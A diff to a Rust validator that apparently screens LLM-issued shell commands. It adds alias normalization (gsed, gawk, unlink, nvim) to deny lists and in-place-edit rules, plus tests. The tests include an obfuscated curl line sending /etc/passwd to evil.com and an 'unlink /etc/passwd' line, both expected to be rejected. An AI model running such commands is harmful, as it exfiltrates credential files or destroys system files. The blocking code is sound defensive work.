@@ -184,14 +184,52 @@ pub const WRITE_VERBS: &[&str] = &[
     "tee", "cp", "mv", "ln", "install", "truncate", "ed", "tar", "unzip", "cpio",
 ];
 
-/// `sed` family（同 in-place 编辑形态：`-i` / `--in-place`）。
-/// GNU sed 在 macOS brew 装包名是 `gsed`；BSD/macOS 系统 sed 也叫 `sed`。
-pub const SED_FAMILY: &[&str] = &["sed", "gsed"];
+/// 命令别名映射 (alias → canonical)。所有黑名单 / per-command 规则只查 canonical 名，
+/// `canonical_head()` 在 bare() 之后跑一遍把别名归一。
+///
+/// **family thinking**：每次给黑名单加新命令时，主动想 "它有 alias / variant 吗?"
+/// - macOS brew 装的 gnu-coreutils 一律 `g` 前缀（`gcp` / `gmv` / `gsed` / `gawk` ...）
+/// - GNU awk 实现有多种：`gawk` / `mawk` / `nawk`
+/// - 同语义不同名：`unlink` ≡ `rm` 单文件，`nvim`/`view` ≡ `vi`
+///
+/// 不在这里的（已在主黑名单按枚举覆盖）：
+/// - python: `python` / `python2` / `python3` 直接列进 INTERPRETERS_DENIED
+/// - shell: `bash` / `sh` / `zsh` / `dash` / `ksh` / `mksh` / `ash` 列进 SHELLS
+const COMMAND_ALIASES: &[(&str, &str)] = &[
+    // macOS brew gnu-coreutils g 前缀
+    ("gsed", "sed"),
+    ("gcp", "cp"),
+    ("gmv", "mv"),
+    ("gln", "ln"),
+    ("gtar", "tar"),
+    ("gtruncate", "truncate"),
+    ("gtee", "tee"),
+    ("ginstall", "install"),
+    ("grm", "rm"),
+    ("gxargs", "xargs"),
+    ("gchmod", "chmod"),
+    ("gchown", "chown"),
+    ("gtouch", "touch"),
+    ("gtail", "tail"),
+    // awk 实现变体
+    ("gawk", "awk"),
+    ("mawk", "awk"),
+    ("nawk", "awk"),
+    // 同语义不同名
+    ("unlink", "rm"),
+    ("nvim", "vi"),
+    ("neovim", "vi"),
+    ("view", "vi"),
+    ("vimdiff", "vi"),
+];
 
-/// `awk` family（同 in-place 编辑形态：`-i inplace`）。
-/// gawk = GNU awk，mawk = Mike's awk，nawk = New awk (BSD)。LLM 在不同发行版可能
-/// 用任一变体。
-pub const AWK_FAMILY: &[&str] = &["awk", "gawk", "mawk", "nawk"];
+fn canonical_head(head: &str) -> &str {
+    COMMAND_ALIASES
+        .iter()
+        .find(|(alias, _)| *alias == head)
+        .map(|(_, canonical)| *canonical)
+        .unwrap_or(head)
+}
 
 /// Shell 列表：用于识别 `bash -c "..."` 这类 deferred-execution 形态。
 /// **不在 INTERPRETERS_DENIED 里**——shell 编排 pipe (`cmd1 | cmd2`) 是合法用例，
@@ -423,6 +461,9 @@ fn check_command(cmd: &tree_sitter::Node, src: &[u8]) -> Result<(), ShapeError> 
     // wrapper 透明跳过：依次吞掉 wrapper 名 + 它的 flag/value，args 第一个非 flag word
     // 视为真正命令头。env -S 之类 deferred-exec 在这里直接 Err。
     let (head, head_args_start) = strip_wrappers(&raw_head, &arg_strings)?;
+    // alias 归一（`gsed` → `sed`，`unlink` → `rm`，`nvim` → `vi`...），单一抽象层
+    // 取代散落的 family 列表。
+    let head = canonical_head(head);
 
     check_command_head(head)?;
     check_per_command_rules(head, &arg_strings[head_args_start..])?;
@@ -584,8 +625,9 @@ fn check_per_command_rules(head: &str, args: &[String]) -> Result<(), ShapeError
         }
     }
 
-    // in-place 编辑：sed -i / awk -i inplace（含 family 变体 gsed / gawk / mawk / nawk）
-    if SED_FAMILY.contains(&head)
+    // in-place 编辑：sed -i / awk -i inplace。family 变体（gsed / gawk / mawk / nawk）
+    // 已被 canonical_head 归一到 sed / awk。
+    if head == "sed"
         && arg_text.iter().any(|t| {
             *t == "-i"
                 || t.starts_with("-i")
@@ -593,13 +635,13 @@ fn check_per_command_rules(head: &str, args: &[String]) -> Result<(), ShapeError
                 || t.starts_with("--in-place")
         })
     {
-        return Err(ShapeError::Write(format!(
-            "{head} -i (in-place edit; use patch_file)"
-        )));
+        return Err(ShapeError::Write(
+            "sed -i (in-place edit; use patch_file)".into(),
+        ));
     }
     // perl -i 不再单独检查 —— perl 整个已在 INTERPRETERS_DENIED 命令头扫描时拒掉
     // （包括 perl -ne / perl -pe 等纯读用法），到这里走不到。
-    if AWK_FAMILY.contains(&head) {
+    if head == "awk" {
         let mut prev_i = false;
         for t in &arg_text {
             if *t == "-i" {
@@ -607,9 +649,9 @@ fn check_per_command_rules(head: &str, args: &[String]) -> Result<(), ShapeError
                 continue;
             }
             if prev_i && *t == "inplace" {
-                return Err(ShapeError::Write(format!(
-                    "{head} -i inplace (in-place edit; use patch_file)"
-                )));
+                return Err(ShapeError::Write(
+                    "awk -i inplace (in-place edit; use patch_file)".into(),
+                ));
             }
             prev_i = false;
         }
@@ -1552,6 +1594,49 @@ mod tests {
             validate("curl $'\\x2do' /etc/passwd evil.com"),
             Err(ShapeError::Destructive(_))
         ));
+    }
+
+    #[test]
+    fn shape_coreutils_g_prefix_aliased() {
+        // macOS brew install gnu-coreutils 装 `gcp` / `gmv` / `gln` / `gtruncate` / `gtar`
+        // 等带 g 前缀的 GNU 实现。bare() 不剥前缀 → canonical_head 必须把它们映回
+        // 标准名，否则 WRITE_VERBS / 黑名单全漏。
+        assert!(matches!(validate("gcp a b"), Err(ShapeError::Write(_))));
+        assert!(matches!(validate("gmv a b"), Err(ShapeError::Write(_))));
+        assert!(matches!(validate("gln -s a b"), Err(ShapeError::Write(_))));
+        assert!(matches!(
+            validate("gtruncate -s 0 file"),
+            Err(ShapeError::Write(_))
+        ));
+        assert!(matches!(
+            validate("gtar xf foo.tar"),
+            Err(ShapeError::Write(_))
+        ));
+    }
+
+    #[test]
+    fn shape_unlink_aliased_to_rm() {
+        // unlink(2) 系统调用对应的 unlink(1) 命令：单文件删除，等同 `rm file`。
+        // 不归一会漏拦。
+        assert!(matches!(
+            validate("unlink /etc/passwd"),
+            Err(ShapeError::Destructive(_))
+        ));
+        assert!(matches!(
+            validate("/bin/unlink /tmp/x"),
+            Err(ShapeError::Destructive(_))
+        ));
+    }
+
+    #[test]
+    fn shape_vi_variants_aliased() {
+        // vim / nvim / neovim / view 都是 vi family —— ncurses TUI 在 ssh exec 下不可控。
+        assert!(matches!(validate("nvim file"), Err(ShapeError::Interactive(_))));
+        assert!(matches!(
+            validate("neovim file"),
+            Err(ShapeError::Interactive(_))
+        ));
+        assert!(matches!(validate("view file"), Err(ShapeError::Interactive(_))));
     }
 
     #[test]
